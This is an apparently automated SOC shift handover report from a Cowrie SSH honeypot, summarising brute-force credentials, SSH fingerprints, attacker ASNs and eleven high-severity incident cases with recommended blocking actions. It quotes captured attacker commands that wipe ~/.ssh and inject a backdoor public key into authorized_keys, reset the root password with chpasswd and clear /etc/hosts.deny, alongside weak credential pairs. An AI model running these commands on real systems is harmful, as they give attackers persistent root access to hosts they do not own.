# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-05-27 |
| **Generated At** | 2026-05-27T23:21:05Z |
| **Shift Time** | 23:21 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **59** |
| Confirmed Threats | **51** |
| False Positives Filtered | **8** (13.6%) |
| Unique Attacker IPs | **26** |
| Countries of Origin | **10** |
| High Severity Cases | **11** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **48** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **20** |
| Unique Credential Pairs | **13** |
| Unique Usernames | **7** |
| Unique Passwords | **12** |
| Successful Auth Pairs | **11** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 11 |
| `345gs5662d34` | 4 |
| `sammy` | 1 |
| `new` | 1 |
| `testuser` | 1 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `3245gs5662d34` | 5 |
| `345gs5662d34` | 4 |
| `123` | 2 |
| `1234!@#$qwerQWER` | 1 |
| `new` | 1 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `root` | `3245gs5662d34` | 5 |
| `345gs5662d34` | `345gs5662d34` | 4 |
| `root` | `1234!@#$qwerQWER` | 1 |
| `sammy` | `123` | 1 |
| `new` | `new` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `1234!@#$qwerQWER` | `84.240.206.218` | 2026-05-27T20:37:33 |
| `root` | `3245gs5662d34` | `84.240.206.218` | 2026-05-27T20:37:39 |
| `root` | `12qwaszx` | `120.48.76.190` | 2026-05-27T21:19:21 |
| `root` | `Qa123456@` | `120.48.76.190` | 2026-05-27T21:25:26 |
| `root` | `3245gs5662d34` | `120.48.76.190` | 2026-05-27T21:25:42 |
| `root` | `Kingsoft@123` | `113.161.39.122` | 2026-05-27T22:40:10 |
| `root` | `3245gs5662d34` | `113.161.39.122` | 2026-05-27T22:40:13 |
| `root` | `0okm)OKM` | `190.181.4.12` | 2026-05-27T22:44:18 |
| `root` | `3245gs5662d34` | `190.181.4.12` | 2026-05-27T22:44:27 |
| `root` | `1012` | `180.184.51.110` | 2026-05-27T22:44:51 |
| `root` | `3245gs5662d34` | `180.184.51.110` | 2026-05-27T22:44:55 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **59** |
| Sessions with Fingerprint | **4** |
| Unique HASSH Fingerprints | **4** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 40 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 22 | 5 |
| `03a80b21afa8...` | Modern SSH client | 6 | 4 |
| `c1953cec4623...` | Mirai/variant | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 22 | 5 | Mirai/variant |
| `95420f9d932d...` | libssh | 11 | 3 | — |
| `03a80b21afa8...` | libssh | 6 | 4 | Modern SSH client |
| `c1953cec4623...` | libssh | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **2** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 5 | 5 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:sD7SFurLyNvP"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `120.48.76.190`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `190.181.4.12`, `180.184.51.110`, `113.161.39.122`, `120.48.76.190`, `84.240.206.218`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **26** |
| Unique ASNs | **17** |
| High-Risk ASNs | **14** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS38365` | Beijing Baidu Netcom Science and Technology Co., Ltd. | 5 | HIGH |
| `AS4134` | CHINANET BACKBONE | 3 | HIGH |
| `AS396982` | Google LLC | 2 | LOW |
| `AS8075` | Microsoft Corporation | 2 | HIGH |
| `AS213412` | ONYPHE SAS | 2 | HIGH |
| `AS14061` | DigitalOcean, LLC | 1 | HIGH |
| `AS142002` | Scloud Pte Ltd | 1 | HIGH |
| `AS274762` | MOBILELINK PROVEDOR DE SERVICOS DE INTERNET LTDA | 1 | MEDIUM |

---

---

## 🚨 Priority Cases — Immediate Attention (11)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-022624cfe735

| Field | Detail |
|---|---|
| **Source IP** | `84.240.206[.]218` |
| **First Seen** | 2026-05-27 20:37 |
| **Last Seen** | 2026-05-27 20:37 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-27 20:37:32` | `cowrie.session.connect` |
| `2026-05-27 20:37:32` | `cowrie.client.version` |
| `2026-05-27 20:37:32` | `cowrie.client.kex` |
| `2026-05-27 20:37:33` | `cowrie.login.success` |
| `2026-05-27 20:37:34` | `cowrie.session.params` |
| `2026-05-27 20:37:34` | `cowrie.command.input` |
| `2026-05-27 20:37:34` | `cowrie.command.failed` |
| `2026-05-27 20:37:34` | `cowrie.log.closed` |
| `2026-05-27 20:37:35` | `cowrie.session.params` |
| `2026-05-27 20:37:35` | `cowrie.command.input` |
| `2026-05-27 20:37:35` | `cowrie.session.file_download` |
| `2026-05-27 20:37:35` | `cowrie.log.closed` |
| `2026-05-27 20:37:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `84.240.206[.]218` to AbuseIPDB if not already reported
- [ ] Block `84.240.206[.]218` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-45e1288eaa9a

| Field | Detail |
|---|---|
| **Source IP** | `84.240.206[.]218` |
| **First Seen** | 2026-05-27 20:37 |
| **Last Seen** | 2026-05-27 20:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-27 20:37:38` | `cowrie.session.connect` |
| `2026-05-27 20:37:38` | `cowrie.client.version` |
| `2026-05-27 20:37:38` | `cowrie.client.kex` |
| `2026-05-27 20:37:39` | `cowrie.login.success` |
| `2026-05-27 20:37:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `84.240.206[.]218` to AbuseIPDB if not already reported
- [ ] Block `84.240.206[.]218` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1402535e82cd

| Field | Detail |
|---|---|
| **Source IP** | `120.48.76[.]190` |
| **First Seen** | 2026-05-27 21:19 |
| **Last Seen** | 2026-05-27 21:19 |
| **Session Duration** | 36s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:sD7SFurLyNvP"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-27 21:19:19` | `cowrie.session.connect` |
| `2026-05-27 21:19:19` | `cowrie.client.version` |
| `2026-05-27 21:19:19` | `cowrie.client.kex` |
| `2026-05-27 21:19:21` | `cowrie.login.success` |
| `2026-05-27 21:19:22` | `cowrie.session.params` |
| `2026-05-27 21:19:22` | `cowrie.command.input` |
| `2026-05-27 21:19:22` | `cowrie.command.failed` |
| `2026-05-27 21:19:22` | `cowrie.log.closed` |
| `2026-05-27 21:19:22` | `cowrie.session.params` |
| `2026-05-27 21:19:22` | `cowrie.command.input` |
| `2026-05-27 21:19:22` | `cowrie.session.file_download` |
| `2026-05-27 21:19:22` | `cowrie.log.closed` |
| `2026-05-27 21:19:39` | `cowrie.session.params` |
| `2026-05-27 21:19:39` | `cowrie.command.input` |
| `2026-05-27 21:19:39` | `cowrie.log.closed` |
| `2026-05-27 21:19:39` | `cowrie.session.params` |
| `2026-05-27 21:19:39` | `cowrie.command.input` |
| `2026-05-27 21:19:40` | `cowrie.log.closed` |
| `2026-05-27 21:19:40` | `cowrie.session.params` |
| `2026-05-27 21:19:40` | `cowrie.command.input` |
| `2026-05-27 21:19:41` | `cowrie.session.file_download` |
| `2026-05-27 21:19:41` | `cowrie.log.closed` |
| `2026-05-27 21:19:42` | `cowrie.session.params` |
| `2026-05-27 21:19:42` | `cowrie.command.input` |
| `2026-05-27 21:19:43` | `cowrie.log.closed` |
| `2026-05-27 21:19:43` | `cowrie.session.params` |
| `2026-05-27 21:19:43` | `cowrie.command.input` |
| `2026-05-27 21:19:44` | `cowrie.log.closed` |
| `2026-05-27 21:19:44` | `cowrie.session.params` |
| `2026-05-27 21:19:44` | `cowrie.command.input` |
| `2026-05-27 21:19:44` | `cowrie.command.input` |
| `2026-05-27 21:19:45` | `cowrie.log.closed` |
| `2026-05-27 21:19:45` | `cowrie.session.params` |
| `2026-05-27 21:19:45` | `cowrie.command.input` |
| `2026-05-27 21:19:46` | `cowrie.log.closed` |
| `2026-05-27 21:19:46` | `cowrie.session.params` |
| `2026-05-27 21:19:46` | `cowrie.command.input` |
| `2026-05-27 21:19:47` | `cowrie.log.closed` |
| `2026-05-27 21:19:47` | `cowrie.session.params` |
| `2026-05-27 21:19:47` | `cowrie.command.input` |
| `2026-05-27 21:19:49` | `cowrie.log.closed` |
| `2026-05-27 21:19:49` | `cowrie.session.params` |
| `2026-05-27 21:19:49` | `cowrie.command.input` |
| `2026-05-27 21:19:50` | `cowrie.log.closed` |
| `2026-05-27 21:19:50` | `cowrie.session.params` |
| `2026-05-27 21:19:50` | `cowrie.command.input` |
| `2026-05-27 21:19:50` | `cowrie.log.closed` |
| `2026-05-27 21:19:51` | `cowrie.session.params` |
| `2026-05-27 21:19:51` | `cowrie.command.input` |
| `2026-05-27 21:19:52` | `cowrie.log.closed` |
| `2026-05-27 21:19:52` | `cowrie.session.params` |
| `2026-05-27 21:19:52` | `cowrie.command.input` |
| `2026-05-27 21:19:53` | `cowrie.log.closed` |
| `2026-05-27 21:19:53` | `cowrie.session.params` |
| `2026-05-27 21:19:53` | `cowrie.command.input` |
| `2026-05-27 21:19:53` | `cowrie.log.closed` |
| `2026-05-27 21:19:54` | `cowrie.session.params` |
| `2026-05-27 21:19:54` | `cowrie.command.input` |
| `2026-05-27 21:19:54` | `cowrie.log.closed` |
| `2026-05-27 21:19:54` | `cowrie.session.params` |
| `2026-05-27 21:19:54` | `cowrie.command.input` |
| `2026-05-27 21:19:55` | `cowrie.log.closed` |
| `2026-05-27 21:19:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.76[.]190` to AbuseIPDB if not already reported
- [ ] Block `120.48.76[.]190` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-543d6756a54e

| Field | Detail |
|---|---|
| **Source IP** | `120.48.76[.]190` |
| **First Seen** | 2026-05-27 21:25 |
| **Last Seen** | 2026-05-27 21:25 |
| **Session Duration** | 17s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-27 21:25:25` | `cowrie.session.connect` |
| `2026-05-27 21:25:25` | `cowrie.client.version` |
| `2026-05-27 21:25:25` | `cowrie.client.kex` |
| `2026-05-27 21:25:26` | `cowrie.login.success` |
| `2026-05-27 21:25:28` | `cowrie.session.params` |
| `2026-05-27 21:25:28` | `cowrie.command.input` |
| `2026-05-27 21:25:28` | `cowrie.command.failed` |
| `2026-05-27 21:25:28` | `cowrie.log.closed` |
| `2026-05-27 21:25:31` | `cowrie.session.params` |
| `2026-05-27 21:25:31` | `cowrie.command.input` |
| `2026-05-27 21:25:32` | `cowrie.session.file_download` |
| `2026-05-27 21:25:32` | `cowrie.log.closed` |
| `2026-05-27 21:25:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.76[.]190` to AbuseIPDB if not already reported
- [ ] Block `120.48.76[.]190` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cb0110dddccd

| Field | Detail |
|---|---|
| **Source IP** | `120.48.76[.]190` |
| **First Seen** | 2026-05-27 21:25 |
| **Last Seen** | 2026-05-27 21:25 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-27 21:25:40` | `cowrie.session.connect` |
| `2026-05-27 21:25:40` | `cowrie.client.version` |
| `2026-05-27 21:25:40` | `cowrie.client.kex` |
| `2026-05-27 21:25:42` | `cowrie.login.success` |
| `2026-05-27 21:25:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.76[.]190` to AbuseIPDB if not already reported
- [ ] Block `120.48.76[.]190` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-50550da0acbd

| Field | Detail |
|---|---|
| **Source IP** | `113.161.39[.]122` |
| **First Seen** | 2026-05-27 22:40 |
| **Last Seen** | 2026-05-27 22:40 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-27 22:40:09` | `cowrie.session.connect` |
| `2026-05-27 22:40:09` | `cowrie.client.version` |
| `2026-05-27 22:40:10` | `cowrie.client.kex` |
| `2026-05-27 22:40:10` | `cowrie.login.success` |
| `2026-05-27 22:40:10` | `cowrie.session.params` |
| `2026-05-27 22:40:10` | `cowrie.command.input` |
| `2026-05-27 22:40:10` | `cowrie.command.failed` |
| `2026-05-27 22:40:10` | `cowrie.log.closed` |
| `2026-05-27 22:40:11` | `cowrie.session.params` |
| `2026-05-27 22:40:11` | `cowrie.command.input` |
| `2026-05-27 22:40:11` | `cowrie.session.file_download` |
| `2026-05-27 22:40:11` | `cowrie.log.closed` |
| `2026-05-27 22:40:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `113.161.39[.]122` to AbuseIPDB if not already reported
- [ ] Block `113.161.39[.]122` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7b01d6b43d19

| Field | Detail |
|---|---|
| **Source IP** | `113.161.39[.]122` |
| **First Seen** | 2026-05-27 22:40 |
| **Last Seen** | 2026-05-27 22:40 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-27 22:40:13` | `cowrie.session.connect` |
| `2026-05-27 22:40:13` | `cowrie.client.version` |
| `2026-05-27 22:40:13` | `cowrie.client.kex` |
| `2026-05-27 22:40:13` | `cowrie.login.success` |
| `2026-05-27 22:40:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `113.161.39[.]122` to AbuseIPDB if not already reported
- [ ] Block `113.161.39[.]122` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e957959dff95

| Field | Detail |
|---|---|
| **Source IP** | `190.181.4[.]12` |
| **First Seen** | 2026-05-27 22:44 |
| **Last Seen** | 2026-05-27 22:44 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-27 22:44:17` | `cowrie.session.connect` |
| `2026-05-27 22:44:17` | `cowrie.client.version` |
| `2026-05-27 22:44:17` | `cowrie.client.kex` |
| `2026-05-27 22:44:18` | `cowrie.login.success` |
| `2026-05-27 22:44:19` | `cowrie.session.params` |
| `2026-05-27 22:44:19` | `cowrie.command.input` |
| `2026-05-27 22:44:19` | `cowrie.command.failed` |
| `2026-05-27 22:44:20` | `cowrie.log.closed` |
| `2026-05-27 22:44:20` | `cowrie.session.params` |
| `2026-05-27 22:44:20` | `cowrie.command.input` |
| `2026-05-27 22:44:20` | `cowrie.session.file_download` |
| `2026-05-27 22:44:20` | `cowrie.log.closed` |
| `2026-05-27 22:44:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.181.4[.]12` to AbuseIPDB if not already reported
- [ ] Block `190.181.4[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-29290c420e24

| Field | Detail |
|---|---|
| **Source IP** | `190.181.4[.]12` |
| **First Seen** | 2026-05-27 22:44 |
| **Last Seen** | 2026-05-27 22:44 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-27 22:44:25` | `cowrie.session.connect` |
| `2026-05-27 22:44:25` | `cowrie.client.version` |
| `2026-05-27 22:44:25` | `cowrie.client.kex` |
| `2026-05-27 22:44:27` | `cowrie.login.success` |
| `2026-05-27 22:44:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.181.4[.]12` to AbuseIPDB if not already reported
- [ ] Block `190.181.4[.]12` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-30fd2d07da1c

| Field | Detail |
|---|---|
| **Source IP** | `180.184.51[.]110` |
| **First Seen** | 2026-05-27 22:44 |
| **Last Seen** | 2026-05-27 22:44 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-27 22:44:51` | `cowrie.session.connect` |
| `2026-05-27 22:44:51` | `cowrie.client.version` |
| `2026-05-27 22:44:51` | `cowrie.client.kex` |
| `2026-05-27 22:44:51` | `cowrie.login.success` |
| `2026-05-27 22:44:52` | `cowrie.session.params` |
| `2026-05-27 22:44:52` | `cowrie.command.input` |
| `2026-05-27 22:44:52` | `cowrie.command.failed` |
| `2026-05-27 22:44:52` | `cowrie.log.closed` |
| `2026-05-27 22:44:52` | `cowrie.session.params` |
| `2026-05-27 22:44:52` | `cowrie.command.input` |
| `2026-05-27 22:44:52` | `cowrie.session.file_download` |
| `2026-05-27 22:44:52` | `cowrie.log.closed` |
| `2026-05-27 22:44:55` | `cowrie.session.closed` |

